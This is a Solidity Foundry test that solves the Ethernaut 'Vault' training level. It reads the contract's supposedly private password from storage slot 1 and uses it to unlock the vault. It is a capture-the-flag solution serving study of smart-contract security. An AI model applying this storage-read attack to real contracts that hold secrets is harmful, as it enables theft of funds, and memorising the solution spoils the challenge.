// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

import {EthernautTest} from "./utils/EthernautTest.sol";
import {VaultFactory} from "../src/factories/VaultFactory.sol";
import {Vault} from "../src/levels/Vault.sol";

contract VaultTest is EthernautTest {
    function setUpLevel() public override {
	VaultFactory factory = new VaultFactory();
	ethernaut.registerLevel(factory);
	levelAddress = ethernaut.createLevelInstance(factory);
    }

    function testSolveVault() public {
	Vault instance = Vault(payable(levelAddress));
	bytes32 password = vm.load(levelAddress, bytes32(uint256(1)));
	instance.unlock(password);
	assert(ethernaut.submitLevelInstance(payable(levelAddress)));
    }
}
